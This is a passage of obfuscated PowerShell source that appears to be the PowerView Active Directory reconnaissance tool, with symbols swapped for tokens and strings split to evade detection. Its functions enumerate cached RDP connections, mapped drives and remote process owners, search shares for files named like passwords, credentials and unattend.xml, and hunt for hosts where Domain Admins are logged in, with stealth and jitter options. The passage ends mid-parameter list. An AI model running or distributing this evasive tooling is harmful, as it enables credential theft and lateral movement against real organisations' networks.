                                gIF1FoundConnection.PSObject.TypeNames.Insert(0, 41aPowerView.CachedRDPConnection41a)
                                gIF1FoundConnection
                            }
                        }

                        # pull out all the'+' cached server info with username hints
                        gIF1ServerKeys = gIF1Reg.EnumKey(gIF1HKU,ZfrgIF1UserSIDYwWSoftwareYwWMicrosoftYwWTerminal Server ClientYwWServersZfr).sNames

                        ForEach (gIF1Server in gIF1ServerKeys) {

                            gIF1UsernameHint = gIF1Reg.GetStringValue(gIF1HKU, ZfrgIF1UserSIDYwWSoftwareYwWMicrosoftYwWTerminal Server ClientYwWServersYwWgIF1ServerZfr, 41aUsernameHint41a).sValue

                            gIF1FoundConnection = New-Object PSObject
                            gIF1FoundConnection U9'+'B Add-Member Noteproperty 41aComputerName41a gIF1Computer
               '+'             gIF1FoundConnection U9B Add-Member Noteproperty 41aUserName41a gIF1UserName
                            gIF1FoundConnection U9B Add-Member Noteproperty 41aUserSID41a gIF1UserSID
                            gIF1FoundConnection U9B Add-Member Noteproperty 41aTargetServer41a gIF1Server
                            gIF1FoundConnection U9B Add-Member Noteproperty 41aUsernameHint41a gIF1UsernameHint
                            gIF1FoundConnection.PSObject.TypeNames.Insert(0, 41aPowerView.CachedRDPConnection41a)
                            gIF1FoundConnection
                        }
                    }
                    catch {
                        Write-Verbose Zfr[Get-WMIRegCachedRDPConnection] Error: gIF1_Zfr
                    }
                }
            }
            catch {
                Write-Warning Zfr[Get-WMIRegCachedRDPConnection] Error accessing gIF1Computer, likely insufficient permissions or firewall rules on host: gIF1_Zfr
            }
        }
    }
}


function Get-WMIRegMountedDrive {
<#
.SYNOPSIS

Returns information about saved network mounted drives for the local (or remote) machine.

Note: This function requires administrative rights on the machine you41are enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertFrom-SID  

.DESCRIPTION

Uses remote registry functionality to enumerate recently mounted network drives.

.PARAMETER ComputerName

Specifies the hostname to query for mounted drive information (also accepts IP addresses).
Defaults to 41alocalhost41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegMountedDrive

Returns the saved network mounted drives for the local machine.

.EXAMPLE

Get-WMIRegMountedDrive -ComputerName WINDOWS2.testlab.local

Returns the saved network mounted drives for the WINDOWS2.testlab.local machine

.EXAMPLE

Get-DomainComputer U9B Get-WMIRegMountedDrive

Returns the saved network mounted drives for all machines in the domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-WMIRegMountedDrive -ComputerName PRIMARY.testlab.local -Credential gIF1Cred

.OUTPUTS

PowerView.RegMountedDrive

A PSCustomObject containing the ComputerName and mounted drive information.
#>

    [OutputType(41aPowerView.RegMountedDrive41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = 41alocalhost41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            # HKEY_USERS
            gIF1HKU = 2147483651

            gIF1WmiArguments = @{
                41aList41a = gIF1True
                41aClass41a = 41aStdRegProv41a
                41aNamespace41a = 41arootYwWdefault41a
                41aComputername41a = gIF1Computer
                41aErrorAction41a = 41aStop41a
            }
            if (gIF1PSBoundParameters[41aCredential41a]) { gIF1WmiArguments[41aCredential41a] = gIF1Credential }

            try {
                gIF1Reg = Get-WmiObject @WmiArguments

                # extract out the SIDs of domain users in this hive
        '+'        gIF1UserSIDs = (gIF1Reg.EnumKey(gIF1HKU, 41a41a)).sNames U9B Where-Object { gIF1_ -match 41aS-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+gIF141a }

                ForEach (gIF1UserSID in gIF1UserSIDs) {
                    try {
                        if (gIF1PSBoundParameters[41aCredential41a]) {
                            gIF1UserName = ConvertFrom-SID -ObjectSid gIF1UserSID -Credential gIF1Credential
                        }
                        else {
                            gIF1UserName = ConvertFrom-SID -ObjectSid gIF1UserSID
                        }

                        gIF1DriveLetters = (gIF1Reg.EnumKey(gIF1HKU, ZfrgIF1UserSIDYwWNetworkZfr)).sNames

                        ForEach (gIF1DriveLetter in gIF1DriveLetters) {
                            gIF1ProviderName = gIF1Reg.GetStringValue(gIF1HKU, ZfrgIF1UserSIDYwWNetworkYwWgIF1DriveLetterZfr, 41aProviderName41a).sValue
                            gIF1RemotePath = gIF1Reg.GetStringValue(gIF1HKU, ZfrgIF1UserSIDYwWNetworkYwWgIF1DriveLetterZfr, 41aRemotePath41a).sValue
                            gIF1DriveUserName = gIF1Reg.GetStringValue(gIF1HKU, ZfrgIF1UserSIDY'+'wWNetworkYwWgIF1DriveLetterZfr, 41aUserName41a).sValue
                            if (-not gIF1UserName) { gIF1UserName = 41a41a }

                            if (gIF1RemotePath -and (gIF1RemotePath -ne 41a41a)) {
                                gIF1MountedDrive = New-Object PSObject
                                gIF1MountedDrive U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
                                gIF1MountedDrive U'+'9B Add-Member Noteproperty 41aUserName41a gIF1UserName
                                gIF1MountedDrive U9B Add-Member Noteproperty 41aUserSID41a gIF1UserSID
                                gIF1MountedDrive U9B Add-Member Noteproperty 41aDriveLetter41a gIF1DriveLetter
                                gIF1MountedDrive U9B Add-Member Noteproperty 41aProviderName41a gIF1ProviderName
                                gIF1MountedDrive U9B Add-Member Noteproperty 41aRemotePath41a gIF1RemotePath
                                gIF1MountedDrive U9B Add-Member Noteproperty 41aDriveUserName41a gIF1Driv'+'eUserName
                                gIF1MountedDrive.PSObject.TypeNames.Insert(0, 41a'+'PowerView.R'+'egMountedDrive41a)
                                gIF1MountedDrive
                            }
                        }
                    }
                    catch {
                        Write-Verbose Zfr[Get-WMIRegMountedDrive] Error: gIF1_Zfr
                    }
                }
            }
            catch {
                Write-Warning Zfr[Get-WMIRegMountedDrive] Error accessing gIF1Computer, likely insufficient permissions or firewall rules on host: gIF1_Zfr
            }
        }
    }
}


function Get-WMIProcess {
<#
.SYNOPSIS

Returns a list of processes and their owners on the local or remote machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Uses Get-WMIObject to enumerate all Win32_process instances on the local or remote machine,
including the owners of the particular process.

.PARAMETER ComputerName

Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
Defaults to 41alocalhost41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credential'+'s
for connection to the remote system.

.EXAMPLE

Get-WMIProcess -ComputerName WINDOWS1

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-WMIProcess -ComputerName PRIMARY.testlab.local -Credential gIF1Cred

.OUTPUTS

PowerView.UserProcess

A PSCustomObject containing the remote process information.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.UserProcess41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = 41alocalhost41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            try {
                gIF1WmiArguments = @{
                    41aComputerName41a = gIF1ComputerName
                    41aClass41a = 41aWin32_process41a
                }
                if (gIF1PSBoundParameters[41aCredential41a]) { gIF1WmiA'+'rguments[41aCredential41a] = gIF1Credential }
                Get-WMIobject @WmiArguments U9B ForEach-Object {
                    gIF1Owner = gIF1_.getowner();
                    gIF1Process = New-Object PSObject
                    gIF1Process U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
                    gIF1Process U9B Add-Member Noteproperty 41aProcessName41a gIF1_.ProcessName
                    gIF1Process U9B Add-Member Noteproperty 41aProcessID41a gIF1_.ProcessID
                    gIF1Process U9B Add-Member Noteproperty 41aDomain41a gIF1Owner.Domain
                    gIF1Process U9B Add-Member Noteproperty 41aUser41a gIF1Owner.User
                    gIF1Process.PSObject.TypeNames.Insert(0, 41aPowerView.UserProcess41a)
                    gIF1Process
                }
            }
            catch {
                Write-Verbose Zfr[Get-WMIProcess] Error enumerating remote processes on 41agIF1Computer4'+'1a, access likely denied: gIF1_Zfr
            }
        }
    }
}


function Find-InterestingFile {
<#
.SYNOPSIS

Searches for files on the given path that match a series of specified criteria.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection  

.DESCRIPTION

This function recursively searches a given UNC path for files with
specific keywords in the name (default of pass, sensitive, secret, admin,
login and unattend*.xml). By default, hidden files/folders are included
in search results. If -Credential is passed, Add-RemoteConnection/Remove-RemoteConnection
is used to temporarily map the remote share.

.PARAMETER Path

UNC/local path to recursively search.

.PARAMETER Include

Only return files/folders that match the specified array of strings,
i.e. @(*.doc*, *.xls*, *.ppt*)

.PARAMETER LastAccessTime

Only return files with a LastAccessTime greater than this date value.

.PARAMETER LastWriteTime

Only return files with a LastWriteTime greater than this date value.

.PARAMETER CreationTime

Only return files with a CreationTime greater than this date value.

.PARAMETER OfficeDocs

Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)

.PARAMETER FreshEXEs

Switch. Find .EXEs accessed within the last 7 days.

.PARAMETER ExcludeFolders

Switch. Exclude folders from the search results.

.PARAMETER ExcludeHidden

Switch. Exclude hidden files and folders from the search results.

.PARAMETER CheckWriteAccess

Switch. Only returns files the current user has write access to.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
to connect to remote systems for file enumeration.

.EXAMPLE

Find-InterestingFile -Path ZfrC:YwWBackupYwWZfr

Returns any files on the local path C:YwWBackupYwW that have the default
search term set in the title.

.EXAMPLE

Find-InterestingFile -Path ZfrYwWYwWWINDOWS7YwWUsersYwWZfr -LastAccessTime (Get-Date).AddDays(-7)

Returns any files on the remote path YwWYwWWINDOWS7YwWUsersYwW that have the default
search term set in the title and were accessed within the last week.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Find-InterestingFile -Credential gIF1Cred -Path ZfrYwWYwWPRIMARY.testlab.localYwWCgIF1YwWTempYwWZfr

.OUTPUTS

PowerView.FoundFile
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.FoundFile41a)]
    [CmdletBinding(DefaultParameterSetName = 41aFileSpecification41a)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Path = 41a.YwW41a,

        [Parameter(ParameterSetName = 41aFileSpecification41a)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aSearchTerms41a, 41aTerms41a)]
        [String[]]
        gIF1Include = @(41a*password*41a, 41a*sensitive*41a, 41a*admin*41a, 41a*login*41a, 41a*secret*41a, 41aunattend*.xml41a, 41a*.vmdk41'+'a, 41a*creds*41a, 41a*credential*41a, 41a*.config41a),

        [Parameter(ParameterSetName = 41aFileSpecification41a)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        gIF1LastAccessTime,

        [Parameter(ParameterSetName = 41aFileSpecification41a)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        gIF1LastWriteTime,

        [Parameter(ParameterSetName = 41aFileSpecification41a)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        gIF1CreationTime,

        [Parameter(ParameterSetName = 41aOfficeDocs41a)]
        [Switch]
        gIF1OfficeDocs,

        [Parameter(ParameterSetName = 41aFreshEXEs41a)]
        [Switch]
        gIF1FreshEXEs,

        [Parameter(ParameterSetName = 41aFileSpecification41a)]
        [Switch]
        gIF1ExcludeFolders,

        [Parameter(ParameterSetName = 41aFileSpecification41a)]
        [Switch]
        gIF1ExcludeHidden,

        [Switch]
        gIF1CheckWriteAccess,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1SearcherArguments =  @{
            41aRecurse41a = gIF1True
            41aErrorAction41a = 41aSilentlyContinue41a
            41aInclude41a = gIF1Include
        }
        if (gIF1PSBoundParameters[41aOfficeDocs41a]) {
            gIF1SearcherArguments[41aInclude41a] = @(41a*.doc41a, 41a*.docx41a, 41a*.xls41a, 41a*.xlsx41a, 41a*.ppt41a, 41a*.pptx41a)
        }
        elseif (gIF1PSBoundParameters[41aFreshEXEs41a]) {
            # find .exe41as accessed within the last 7 days
            gIF1LastAccessTime = (Get-Date).AddDays(-7).ToString(41aMM/dd/yyyy41a)
            gIF1SearcherArguments[41aInclude41a] = @(41a*.exe41a)
        }
        gIF1SearcherArguments[41aForce41a] = -not gIF1PSBoundParameters[41aExcludeHidden41a]

        gIF1MappedComputers = @{}

        function Test-Write {
            # short helper to check is the current user can write to a file
            [CmdletBinding()]Param([String]gIF1Path)
            try {
                gIF1Filetest = [IO.File]::OpenWrite(gIF1Path)
                gIF1Filetest.Close()
                gIF1True
            }
            catch {
                gIF1False
            }
        }
    }

    PROCESS {
        ForEach (gIF1TargetPath in gIF1Path) {
            if ((gIF1TargetPath -Match 41aYwWYwWYwWYwW.*YwWYwW.*41a) -and (gIF1PSBoundParameters[41aCredential41a])) {
                gIF1HostComputer = (New-Object System.Uri(gIF1TargetPath)).Host
                if (-not gIF1MappedComputers[gIF1HostComputer]) {
                    # map IPCgIF1 to this computer if it41as not already
                    Add-RemoteConnection -ComputerName gIF1HostComputer -Credential gIF1Credential
                    gIF1MappedComputers[gIF1HostComputer] = gIF1True
                }
            }

            gIF1SearcherArguments[41aPath41a] = gIF1TargetPath
            Get-ChildItem @SearcherArguments U9B ForEach-Object {
                # check if we41are excluding folders
                gIF1Continue = gIF1True
                if (gIF1PSBoundParameters[41aExcludeFolders41a] -and (gIF1_.PSIsContainer)) {
                    Write-Verbose ZfrExcluding: gIF1(gIF1_.FullName)Zfr
                    gIF1Continue = gIF1False
                }
                if (gIF1LastAccessTime -and (gIF1_.LastAccessTime -lt gIF1LastAccessTime)) {
                    gIF1Continue = gIF1False
                }
                if (gIF1PSBoundParameters[41aLastWriteTime41a] -and (gIF1_.LastWriteTime -lt gIF1LastWriteTime)) {
                    gIF1Continue = gIF1False
                }
                if (gIF1PSBoundParameters[41aCreationTime41a] -and (gIF1_.CreationTime -lt gIF1CreationTime)) {
                    gIF1Continue = gIF1False
                }
                if (gIF1PSBoundParameters[41aCheckWriteAccess41a] -and (-not (Test-Write -Path gIF1_.FullName))) {
                    gIF1Continue = gIF1False
                }
                if (gIF1Continue) {
                    gIF1FileParams = @{
                        41aPath41a = gIF1_.FullName
                        41aOwner41a = gIF1((Get-Acl gIF1_.FullName).Owner)
                        41aLastAccessTime41a = gIF1_.LastAccessTime
                        41aLastWriteTime41a = gI'+'F1_.LastWriteTime
                        41aCreationTime41a = gIF1_.CreationTime
                        41aLength41a = gIF1_.Length
                    }
                    gIF1FoundFile = New-Object -TypeName PSObject -Property gIF1FileParams
                    gIF1FoundFile.PSObject.TypeNames.Insert(0, 41aPowerView.FoundFile41a)
                    gIF1FoundFile
                }
            }
        }
    }

    END {
        # remove the IPCgIF1 mappings
        gIF1MappedComputers.Keys U9B Remove-RemoteConnection
    }
}


########################################################
#
# 41aMeta41a-functions start below
#
########################################################

function New-ThreadedFunction {
    # Helper used by any threaded host enumeration functions
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseShouldProcessForStateChangingFunctions41a, 41a41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [String[]]
        gIF1ComputerName,

        [Parameter(Position = 1, Mandatory = gIF1True)]
        [System.Management.Automation.ScriptBlock]
        gIF1ScriptBlock,

        [Parameter(Position = 2)]
        [Hashtable]
        gIF1ScriptParameters,

        [Int]
        [ValidateRange(1,  100)]
        gIF1Threads = 20,

        [Switch]
        gIF1NoImports
    )

    BEGIN {
        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        gIF1SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        # # gIF1SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
        # force a single-threaded apartment state (for token-impersonation stuffz)
        gIF1SessionState.ApartmentState = [System.Threading.Apar'+'tmentState]::STA

        # import the current session state41as variables and functions so the chained PowerView
        #   functionality can be used by the threaded blocks
        if (-not gIF1NoImports) {
            # grab all the current variables for this runspace
            gIF1MyVars = Get-Variable -Scope 2

            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
            gIF1VorbiddenVars = @(41a?41a,41aargs41a,41aConsoleFileName41a,41aError41a,41aExecutionContext41a,41afalse41a,41aHOME41a,41aHost41a,41ainput41a,41aInputObject41a,41aMaximumAliasCount41a,41aMaximumDriveCount41a,41aMaximumErrorCount41a,41aMaximumFunctionCount41a,41aMaximumHistoryCount41a,41aMaximumVariableCount41a,41aMyInvocation41a,41anull41a,41aPID41a,41aPSBoundParameters41a,41aPSCommandPath41a,41aPSCulture41a,41aPSDefaultParameterValues41a,41aPSHOME41a,41aPSScriptRoot41a,41aPSUICulture41a,41aPSVersionTable41a,41aPWD41a,41aShellId41a,41aSynchronizedHash41a,41atrue41a)

            # add Variables from Parent Scope (current runspace) into the InitialSessionState
            ForEach (gIF1Var in gIF1MyVars) {
                if (gIF1VorbiddenVars -NotContains gIF1Var.Name) {
                gIF1SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList gIF1Var.name,gIF1Var.Value,gIF1Var.description,gIF1Var.options,gIF1Var.attributes))
                }
 '+'           }

            # add Functions from current runspace to the InitialSessionState
            ForEach (gIF1Function in (Get-ChildItem Function:)) {
                gIF1SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList gIF1Function.Name, gIF1Function.Definition))
            }
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        #   Thanks Carlos!

        # create a pool of maxThread runspaces
        gIF1Pool = [RunspaceFactory]::CreateRunspacePool(1, gIF1Threads, gIF1SessionState, gIF1Host)
        gIF1Pool.Open()

        # do some trickery to get the proper BeginInvoke() method that allows for an output queue
        gIF1Method = gIF1Null
        ForEach (gIF1M in [PowerShell].GetMethods() U9B Where-Object { gIF1_.Name -eq 41aBeginInvoke41a }) {
            gIF1Method'+'Parameters = gIF1M.GetParameters()
            if ((gIF1MethodParameters.Count -eq 2) -and gIF1MethodParameters[0].Name -eq 41ainput41a -and gIF1MethodParameters[1].Name -eq 41aoutput41a) {
                gIF1Method = gIF1M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        gIF1Jobs = @()
        gIF1ComputerName = gIF1ComputerName U9B Where-Object {gIF1_ -and gIF1_.Trim()}
        Write-Verbose Zfr[New-ThreadedFunction] Total number of hosts: gIF1(gIF1ComputerName.count)Zfr

        # partition all hosts from -ComputerName into gIF1Threads number of groups
        if (gIF1Threads -ge gIF1ComputerName.Length) {
            gIF1Threads = gIF1ComputerName.Length
        }
        gIF1ElementSplitSize = [Int](gIF1ComputerName.Length/gIF1Threads)
        gIF1ComputerNamePartitioned = @()
        gIF1Start = 0
        gIF1End = gIF1ElementSplitSize

        for(gIF1i = 1; gIF1i -le gIF1Threads; gIF1i++) {
            gIF1List = New-Object System.Collections.ArrayList
            if (gIF1i -eq gIF1Threads) {
                gIF1End = gIF1ComputerName.Length
            }
            gIF1List.AddRange(gIF1ComputerName[gIF1Start..(gIF1End-1)])
            gIF1Start += gIF1ElementSplitSize
            gIF1End += gIF1ElementSplitSize
            gIF1ComputerNamePartitioned += @(,@(gIF1List.ToArray()))
        }

        Write-Verbose Zfr[New-ThreadedFunction] Total number of threads/partitions: gIF1ThreadsZfr

        ForEach (gIF1ComputerNamePartition in gIF1ComputerNamePartitioned) {
            # create a Zfrpowershell pipeline runnerZfr
            gIF1PowerShell = [PowerShell]::Create()
            gIF1PowerShell.runspacepool = gIF1Pool

            # add the script block + arguments with the given computer partition
            gIF1Null = gIF1PowerShell.AddScript(gIF1ScriptBlock).AddParameter(41aComputerName41a, gIF1ComputerNamePartition)
            if (gIF1ScriptParameters) {
                ForEach (gIF1Param in gIF1ScriptParameters.GetEnumerator()) {
                    gIF1Null = gIF1PowerShell.AddParameter(gIF1Param.Name, gIF1Param.Value)
                }
            }

            # create the output queue
            gIF1Output = New-Object Management.Automation.PSDataCollection[Object]

            # kick off execution using the BeginInvok() method that allows queues
            gIF1Jobs += @{
                PS = gIF1PowerShell
                Output = gIF1Output
                Result = gIF1Method.Invoke(gIF1PowerShell, @(gIF1Null, [Management.Automation.PSDataCollection[Object]]gIF1Output))
            }
        }
    }

    END {
        Write-Verbose Zfr[New-ThreadedFunction] Threads executingZfr

        # continuously loop through each job queue, consuming output as appropriate
        Do {
            ForEach (gIF1Job in gIF1Jobs) {
                gIF1Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While ((gIF1Jobs U9B Where'+'-Object { -not gIF1_.Result.IsCompleted }).Count -gt 0)

        gIF1SleepSeconds = 100
        Write-Verbose Zfr[New-ThreadedFunction] Waiting gIF1SleepSeconds seconds for final'+' cleanup...Zfr

        # cleanup- make sure we didn41at miss anything
        for (gIF1i=0; gIF1i -lt gIF1SleepSeconds; gIF1i++) {
            ForEach (gIF1Job in gIF1Jobs) {
                gIF1Job.Output.ReadAll()
                gIF1Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        gIF1Pool.Dispose()
        Write-Verbose Zfr[New-ThreadedFunction] all threads completedZfr
    }
}


function Find-DomainUserLocation {
<#
.SYNOPSIS

Finds domain machines where specific users are logged into.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainFileServer, Get-DomainDFSShare, Get-DomainController, Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetSession, Test-AdminAccess, Get-NetLoggedon, Resolve-IPAddress, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and queries the domain for users of a specified group
(default 41aDomain Admins41a) with Get-DomainGroupMember. Then for each server the
function enumerates any active user sessions with Get-NetSession/Get-NetLoggedon
The found user list is compared against the target list, and any matches are
displayed. If -ShowAll is specified, all results are displayed instead of
the filtered set. If -Stealth is specified, then likely highly-trafficed servers
are enumerated with Get-DomainFileServer/Get-DomainController, and session
enumeration is executed only against those servers. If -Credential is passed,
then Invoke-UserImpersonation is used to impersonate the specified user
before enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER Domain

Specifies the domain to query for computers AND users, defaults to the current domain.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr. Useful for OU queries.

.PARAMETER ComputerUnconstrained

Switch. Search computer objects that have unconstrained delegation.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr. Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to 41aDomain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with 41a(adminCount=1)41a (meaning are/were privileged).

.PARAMETER UserAllowDelegation

Switch. Search for user accounts that are not marked as 41asensitive and not allowed for delegation41a.

.PARAMETER CheckAccess

Switch. Check if the current user has local admin access to computers where target users are found.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER ShowAll

Switch. Return all user location results instead of filtering based on target
specifications.

.PARAMETER Stealth

Switch. Only enumerate sessions from connonly used target servers.

.PARAMETER StealthSource

The source of target servers to use, 41aDFS41a (distributed file servers),
41aDC41a (domain controllers), 41aFile41a (file servers), or 41aAll41a (the default).

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainUserLocation

Searches for 41aDomain Admins41a by enumerating every computer in the domain.

.EXAMPLE

Find-DomainUserLocation -Stealth -ShowAll

Enumerates likely highly-trafficked servers, performs just session enumeration
against each, and outputs all result'+'s.

.EXAMPLE

Find-DomainUserLocation -UserAdminCount -ComputerOperatingSystem 41aWindows 7*41a -Domain dev.testlab.local

Enumerates Windows 7 computers in dev.testlab.local and returns user results for privileged
users in dev.testlab.local.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Find-DomainUserLocation -Domain testlab.local -Credential gIF1Cred

Searches for domain admin locations in the testlab.local using the specified alternate credentials.

.OUTPUTS

PowerView.UserLocation
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.UserLocation41a)]
    [CmdletBinding(DefaultParameterSetName = 41aUserGroupIdentity41a)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDNSHostName41a)]
        [String[]]
        gIF1ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerSearchBase,

        [Alias(41aUnconstrained41a)]
        [Switch]
        gIF1ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias(41aOperatingSystem41a)]
        [String]
        gIF1ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(41aServicePack41a)]
        [String]
        gIF1ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(41aSiteName41a)]
        [String]
        gIF1ComputerSiteName,

        [Parameter(ParameterSetName = 41aUserIdentity41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1UserSe'+'archBase,

        [Parameter(ParameterSetName = 41aUserGroupIdentity41a)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aGroupName41a, 41aGroup41a)]
        [String[]]
        gIF1UserGroupIdentity = 41aDomain Admins41a,

        [Alias(41aAdminCount41a)]
        [Switch]
        gIF1UserAdminCount,

        [Alias(41aAllowDelegation41a)]
        [Switch]
        gIF1UserAllowDelegation,

        [Switch]
        gIF1CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

